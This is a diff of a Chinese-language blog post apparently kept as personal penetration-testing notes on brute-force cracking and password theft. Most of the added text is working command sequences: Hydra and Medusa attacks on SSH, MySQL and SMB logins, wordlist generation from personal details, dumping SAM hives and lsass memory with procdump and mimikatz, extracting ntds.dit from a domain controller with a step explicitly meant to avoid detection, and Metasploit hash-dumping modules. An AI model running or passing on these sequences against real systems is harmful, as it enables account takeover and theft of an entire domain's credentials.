@@ -8,7 +8,7 @@
   
   
   
-  <title>暴力破解 | JohnScott2046的博客</title>
+  <title>29暴力破解 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,12 +254,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>暴力破解</span>
+    <span>29暴力破解</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2021-08-20
+      2021-08-26
     </span>
     
       <span>
@@ -292,6 +292,8 @@
 
 <p>解决方法：升级Hydra版本 <code>apt install --only-upgrade hydra -y</code></p>
 <h4 id="3-破解ssh"><a href="#3-破解ssh" class="headerlink" title="3. 破解ssh"></a>3. 破解ssh</h4><p>hydra -l root -P pass.txt -t 4 ssh://192.168.1.230 -e nsr -vV</p>
+<h4 id="4-mysql"><a href="#4-mysql" class="headerlink" title="4. mysql"></a>4. mysql</h4><p>hydra -L user.txt -P wordlist.txt 192.168.1.230 mysql</p>
+<p>hydra -l root -P /mnt/hgfs/www/pass.txt -t 1 192.168.1.230 -s 3308 mysql</p>
 <h3 id="二、-xhydra图形破解工具"><a href="#二、-xhydra图形破解工具" class="headerlink" title="二、 xhydra图形破解工具"></a>二、 xhydra图形破解工具</h3><p>yum install mariadb-server<br>systemctl start mariadb</p>
 <p>mysql -u root -p123456<br>grant all privileges on <em>.</em> to ‘root’@’%’identified by ‘123456’ with grant option;</p>
 <h3 id="三、-Medusa破解工具"><a href="#三、-Medusa破解工具" class="headerlink" title="三、 Medusa破解工具"></a>三、 Medusa破解工具</h3><p><a target="_blank" rel="noopener" href="http://foofus.net/goons/jmk/medusa/medusa.html">http://foofus.net/goons/jmk/medusa/medusa.html</a></p>
@@ -306,6 +308,7 @@
 <h4 id="1-破解smb-1"><a href="#1-破解smb-1" class="headerlink" title="1. 破解smb"></a>1. 破解smb</h4><p>medusa -M smbnt -h 192.168.1.230 -e ns -F -u administrator -P pass.txt</p>
 <h4 id="2-破解ssh"><a href="#2-破解ssh" class="headerlink" title="2. 破解ssh"></a>2. 破解ssh</h4><p>medusa -M ssh -h 192.168.1.230 -e ns -F -u root -P pass.txt<br>medusa -M ssh -h 192.168.1.230 -u root -P pass.txt -t 8 -O ./ssh.log</p>
 <h4 id="3-破解MySQL"><a href="#3-破解MySQL" class="headerlink" title="3. 破解MySQL"></a>3. 破解MySQL</h4><p>medusa -M mysql -h 192.168.1.230 -e ns -F -u root -P pass.txt</p>
+<h4 id="4-mysql-1"><a href="#4-mysql-1" class="headerlink" title="4.mysql"></a>4.mysql</h4><p>medusa -h 192.168.1.230 -u root -P wordlist.txt -M mysql</p>
 <h3 id="四、-离线破解shadow加密文件"><a href="#四、-离线破解shadow加密文件" class="headerlink" title="四、 离线破解shadow加密文件"></a>四、 离线破解shadow加密文件</h3><p>cat /etc/shadow</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$nnHgoxM..mFC.OkWzJ2yU1$GxDq6NMeSqsOrMz67liyBfAKLl5VOeBexUuz0UvwoE3:18830:0:99999:7:::</span><br><span class="line">daemon:*:18821:0:99999:7:::</span><br><span class="line">bin:*:18821:0:99999:7:::</span><br><span class="line">sys:*:18821:0:99999:7:::</span><br><span class="line">sync:*:18821:0:99999:7:::</span><br><span class="line">games:*:18821:0:99999:7:::</span><br><span class="line">man:*:18821:0:99999:7:::</span><br><span class="line">lp:*:18821:0:99999:7:::</span><br><span class="line">mail:*:18821:0:99999:7:::</span><br><span class="line">proxy:*:18821:0:99999:7:::</span><br><span class="line">www-data:*:18821:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
@@ -325,6 +328,11 @@
 <p>标志，一律不适用</p>
 <p>pwunconv(把密码恢复到/etc/passwd文件中去)<br>pwconv(把密码从/etc/passwd文件中取出来,放到/etc/shadow文件中)</p>
 <p>密码组成部分，$id $salt（盐）$加密密码文<br>当 id 为 1 时，表示使用 md5 进行加密<br>当 id 为 5 时，表示使用 SHA256 进行加密<br>当 id 为 6 时，表示使用 SHA512 进行加密</p>
+<h4 id="破解Windows文件共享密碼"><a href="#破解Windows文件共享密碼" class="headerlink" title="破解Windows文件共享密碼"></a>破解Windows文件共享密碼</h4><p>medusa -M smbnt -h 192.168.1.53 -e ns -F -u administrator -P m.txt<br>          smb協議     目標ip        破解成功停止      用戶名      密碼</p>
+<h4 id="破解linux用戶密碼"><a href="#破解linux用戶密碼" class="headerlink" title="破解linux用戶密碼"></a>破解linux用戶密碼</h4><p>medusa -M ssh -h 192.168.1.53 -e ns -F -u root -P m.txt</p>
+<p>将成功破解的记录记录到文件中<br>medusa -M ssh -h 192.168.1.53 -u root -P m.txt -t 8 -O ./ssh.log</p>
+<h4 id="破解Mysql用户登录密码-需要MySQL開啟遠程訪問"><a href="#破解Mysql用户登录密码-需要MySQL開啟遠程訪問" class="headerlink" title="破解Mysql用户登录密码(需要MySQL開啟遠程訪問)"></a>破解Mysql用户登录密码(需要MySQL開啟遠程訪問)</h4><p>medusa -M mysql -h 192.168.1.53 -e ns -F -u root -P m.txt</p>
+<p>驗證<br>mysql -uroot -p -h192.168.1.53</p>
 <h3 id="windows文件共享"><a href="#windows文件共享" class="headerlink" title="windows文件共享"></a>windows文件共享</h3><p>在Windows系统当中，默认会启动一些文件共享，比如 C$ 或 ADMIN$（管理共享），而这些共享是使用smb协议，因此我可以针对smb协议进行破解</p>
 <p><code>net share</code>  命令可以查看windows有那些共享</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C$           C:\                             默认共享</span><br><span class="line">D$           D:\                             默认共享</span><br><span class="line">F$           F:\                             默认共享</span><br><span class="line">IPC$                                         远程 IPC</span><br><span class="line">ADMIN$       C:\Windows                      远程管理</span><br><span class="line">WorkSpace    D:\WorkSpace</span><br><span class="line">www          D:\kali\www</span><br></pre></td></tr></table></figure>
@@ -361,6 +369,124 @@
 <ol start="2">
 <li>不保存到硬盘到，直接给其他工具使用<br>crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w -<br>crunch 10 10 12345 –stdout | airolib-ng testdb -import passwd</li>
 </ol>
+<h3 id="pydictor"><a href="#pydictor" class="headerlink" title="pydictor"></a>pydictor</h3><p>一个强大实用的黑客暴力破解字典建立工具</p>
+<p>(官方语法)[<a href="https://github.com/LandGrey/pydictor/blob/master/README_CN.md]">https://github.com/LandGrey/pydictor/blob/master/README_CN.md]</a> <a href="https://github.com/LandGrey/pydictor/blob/master/README_CN.md">https://github.com/LandGrey/pydictor/blob/master/README_CN.md</a></p>
+<p>git clone –depth=1 –branch=master <a target="_blank" rel="noopener" href="https://www.github.com/landgrey/pydictor.git">https://www.github.com/landgrey/pydictor.git</a><br>cd pydictor/<br>chmod +x pydictor.py<br>python pydictor.py</p>
+<p>常见的生成字典模式</p>
+<ol>
+<li>生成纯数字字典</li>
+</ol>
+<p>python pydictor.py -base d –len 1 6        生成1-6位纯数字密码字典<br>python pydictor.py -base d –len 6 6        生成6位纯数字密码字典</p>
+<ol start="2">
+<li>生成数字+字母的字典</li>
+</ol>
+<p>python pydictor.py -base dL –len 1 3       生成1-3位数字小写字母混合密码</p>
+<ol start="3">
+<li>根据社会工程学生成字典</li>
+</ol>
+<p>python pydictor.py –sedb</p>
+<p>用 set 来设置参数，如：<br>    set cname test<br>    set phone 13011112222<br>    set email 13011112222@gmail</p>
+<p>设置完参数运行：run</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] A total of :3161 lines</span><br><span class="line">[+] Store in   :&#x2F;mnt&#x2F;hgfs&#x2F;www&#x2F;pydictor&#x2F;results&#x2F;sedb_113053.txt</span><br><span class="line">[+] Cost       :0.3934 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="密码窃取"><a href="#密码窃取" class="headerlink" title="密码窃取"></a>密码窃取</h3><p>注册表读取密码，主要获取的是两个文件</p>
+<p>reg save HKLM\SYSTEM Sys.hiv<br>reg save HKLM\SAM Sam.hiv</p>
+<p>导出注册表之后，我们可以通过mimikatz读取密码hash值</p>
+<p>mimikatz读取密码<br>mimikatz.exe “lsadump::sam /sam:Sam.hiv /system:Sys.hiv “ exit&gt; hiv.txt</p>
+<p>打开文件hiv.txt，NTLM加密的hash就是管理员登陆的加密密码</p>
+<h3 id="lsass内存读取密码"><a href="#lsass内存读取密码" class="headerlink" title="lsass内存读取密码"></a>lsass内存读取密码</h3><p>lsass.exe是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略zhi。</p>
+<p>注意： 要想读取内存的密码，前提是用户登陆过机器，登陆过就会在内存中停留：lsass.exe</p>
+<p>使用工具： procdump.exe</p>
+<p>procdump.exe -accepteula -ma lsass.exe lsass.dmp</p>
+<p>然后再通过mimikatz读取，08或者08以下的机器读取的是明文密码</p>
+<p>mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”</p>
+<h3 id="LaZagne读取各类密码（浏览器等）"><a href="#LaZagne读取各类密码（浏览器等）" class="headerlink" title="LaZagne读取各类密码（浏览器等）"></a>LaZagne读取各类密码（浏览器等）</h3><p>LaZagne是用于开源应用程序获取大量的密码存储在本地计算机上，每个软件都使用不同的技术（明文，API，自定义算法，数据库等）存储其密码</p>
+<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a><br><a href="https://github.com/AlessandroZ/LaZagne/releases">https://github.com/AlessandroZ/LaZagne/releases</a></p>
+<p>获取所有的密码</p>
+<p>lazagne.exe all</p>
+<h3 id="获取域内所有用户hash-前提是拿到域控"><a href="#获取域内所有用户hash-前提是拿到域控" class="headerlink" title="获取域内所有用户hash(前提是拿到域控)"></a>获取域内所有用户hash(前提是拿到域控)</h3><p>windows的密码是经过hash后存储的，本地存在hklm\sam，hklm\system注册表中。</p>
+<p>域是存在域控制器的c:\windows\ntds\ntds.dit中，ntds.dit其实就是一个esent数据库，微软本身就有一系列的文档化api能够操作这个数据库。</p>
+<p>相关连接 <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx</a></p>
+<ol>
+<li>创建快照(域控服务器)</li>
+</ol>
+<p>ntdsutil snapshot “activate instance ntds” create quit quit</p>
+<p>成功生成快照集 {****} 这里面的ID要记住</p>
+<ol start="2">
+<li>挂载快照</li>
+</ol>
+<p>ntdsutil snapshot “mount {****}” quit quit</p>
+<p>记录返回结果的 SNAP_**_VOLUMEC 名称</p>
+<ol start="3">
+<li>复制快照到本地</li>
+</ol>
+<p>copy C:$SNAP_**_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</p>
+<ol start="4">
+<li>卸载快照(防止被发现)</li>
+</ol>
+<p>ntdsutil snapshot “unmount {****}” quit quit</p>
+<ol start="5">
+<li>删除快照</li>
+</ol>
+<p>ntdsutil snapshot “delete {****}” quit quit</p>
+<ol start="6">
+<li>获取key（用于解密）</li>
+</ol>
+<p>通过注册表方式，将key保存下来</p>
+<p>reg save HKLM\SYSTEM c:\Sys.hiv</p>
+<ol start="7">
+<li>使用NTDSDumpEx获取所有域用户的hash</li>
+</ol>
+<p>NTDSDumpEx.exe -d ntds.dit -o hash.txt -s Sys.hiv -h</p>
+<h3 id="Windows-Hash散列值"><a href="#Windows-Hash散列值" class="headerlink" title="Windows Hash散列值"></a>Windows Hash散列值</h3><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理，在域环境中，用户信息存储在 ntds.dit 中，加密后为散列值。</p>
+<p>在 Windows 操作系统中，Hash 的结构通常如下</p>
+<p>username:RID:LM-HASH:NT-HASH</p>
+<p>LM Hash（LAN Manager Hash）其本质是 DES 加密，在 Windows 2008 及开始之后默认禁用的是 LM Hash；<br>NTLM Hash 是基于 MD4 加密算法进行加密的，服务器从 Windows Server 2003 以后，Windows 操作系统的认证方式均为 NTLM Hash；</p>
+<h4 id="散列值抓取"><a href="#散列值抓取" class="headerlink" title="散列值抓取"></a>散列值抓取</h4><p>要想在 Windows 操作系统中抓取散列值或明文密码，必须将权限提升为 System。</p>
+<p>本地用户名，散列值和其他安全验证信息都保存在 SAM 文件中。</p>
+<p>lsass.exe 进程用于实现 Windows 的安全策略（本地安全策略和登录策略）。可以使用工具将散列值和明文密码从内存中的 lsass.exe 进程或 SAM 文件中导出。</p>
+<h4 id="PwDump7-需要有系统权限shell"><a href="#PwDump7-需要有系统权限shell" class="headerlink" title="PwDump7(需要有系统权限shell)"></a>PwDump7(需要有系统权限shell)</h4><p>在命令行环境中运行 PwDump7 程序，可以得到系统中所有账户的 NTLM Hsh</p>
+<p>下载地址 <a target="_blank" rel="noopener" href="https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump7.zip">https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump7.zip</a></p>
+<h4 id="QuarkPwDump"><a href="#QuarkPwDump" class="headerlink" title="QuarkPwDump"></a>QuarkPwDump</h4><p>github地址 <a href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a></p>
+<p>下载地址 <a target="_blank" rel="noopener" href="https://codeload.github.com/quarkslab/quarkspwdump/zip/master">https://codeload.github.com/quarkslab/quarkspwdump/zip/master</a></p>
+<p>导出用户的 NTML Hash</p>
+<p>QuarksPwDump.exe –dump-hash-local</p>
+<h4 id="通过-SAM-和-System-文件抓取密码"><a href="#通过-SAM-和-System-文件抓取密码" class="headerlink" title="通过 SAM 和 System 文件抓取密码"></a>通过 SAM 和 System 文件抓取密码</h4><ol>
+<li>导出 SAM 和 System 文件：通过 reg 的注册表导出</li>
+</ol>
+<p>reg save hklm\sam sam.hive<br>reg save hklm\system system.hive</p>
+<ol start="2">
+<li>通过读取 SAM 和System 文件获得 NTLM Hash</li>
+</ol>
+<p>使用mimikatz读取SAM和System文件<br>将导出的 system.hive 和 sam.hive 文件放到 mimikatz 文件夹下，然后运行mimikatz命令<br>lsadump::sam /sam:sam.hive /system:system.hive</p>
+<p>使用mimikatz直接读取本地 SAM文件，导出Hash信息(需要在目标机器上运行mimikatz)<br>privilege::debug  提升权限<br>token::elevate    提升权限为system<br>lsadump::sam      读取本地SAM文件，获得NTLM Hash</p>
+<p>使用 Mimikatz 在线读取 SAM 文件<br>在目标mimikatz目录下运行命令，在线读取散列值及明文密码<br>mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”</p>
+<h3 id="使用-Mimikatz-离线读取-lsass-dmp-文件"><a href="#使用-Mimikatz-离线读取-lsass-dmp-文件" class="headerlink" title="使用 Mimikatz 离线读取 lsass.dmp 文件"></a>使用 Mimikatz 离线读取 lsass.dmp 文件</h3><ol>
+<li>导出lsass.dmp文件</li>
+</ol>
+<p>下载地址 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
+<p>通过 procdump.exe 文件导出lsass.dmp文件</p>
+<p>procdump.exe -accepteula -ma lsass.exe lsass.dmp</p>
+<ol start="2">
+<li>使用mimikatz导出lsass.dmp文件中的密码散列值</li>
+</ol>
+<p>先将导出的lsass.dmp文件放到mimikatz的目录下，然后输入命令</p>
+<p>sekurlsa::minidump lsass.dmp</p>
+<ol start="3">
+<li>运行命令导出密码散列值</li>
+</ol>
+<p>sekurlsa::logonPasswords full</p>
+<h3 id="psexec-ntdsgrab"><a href="#psexec-ntdsgrab" class="headerlink" title="psexec_ntdsgrab"></a>psexec_ntdsgrab</h3><p>use auxiliary/admin/smb/psexec_ntdsgrab<br>set rhosts 192.168.1.25<br>set smbdomain krystal.org<br>set smbuser administrator<br>set smbpass Admin12345<br>exploit<br>exploit<br>要运行两次，该脚本使用卷影拷贝服务</p>
+<p>以通过SMB服务直接与域控制器进行身份验证，创建系统驱动的卷影复制，并将NTDS.DIT和SYSTEM hive的副本下载到Metasploit目录中。这些文件可以与impacket等其他工具一起使用，这些工具可用于执行活动目录密码哈希值的提取。</p>
+<p>ntds.dit 和 SYSTEM会放在 /root/.msf4/loot/</p>
+<p>之后就可以使用 impacket 工具包等解析 ntds.dit文件，导出域账号和域散列值了</p>
+<h3 id="Metasploit-会话获取域账号和哈希值-需要反弹shell后"><a href="#Metasploit-会话获取域账号和哈希值-需要反弹shell后" class="headerlink" title="Metasploit 会话获取域账号和哈希值(需要反弹shell后)"></a>Metasploit 会话获取域账号和哈希值(需要反弹shell后)</h3><p>use post/windows/gather/credentials/domain_hashdump<br>set session 2<br>exploit </p>
+<p>通过 MSF 加载 mimikatz 来读取密码<br>load mimikatz</p>
+<p>抓取明文密码<br>wdigest </p>
+<p>抓取明文密码<br>kerberos</p>
+<p>抓取加密后的ntlm、lm密码<br>msv</p>
     </div>
   </div>
   
@@ -463,13 +589,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/28XXE-XML%E5%A4%96%E9%83%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/" target="_self">XXE-XML外部注入實體攻擊</a>
+        <a href="/2021/28XXE-XML%E5%A4%96%E9%83%A8%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/" target="_self">28XXE-XML外部注入實體攻擊</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/30%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_self">文件上传漏洞</a>
+        <a href="/2021/30%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_self">30文件上传漏洞</a>
         <i class="iconfont icon-next"></i>
       </div>
     
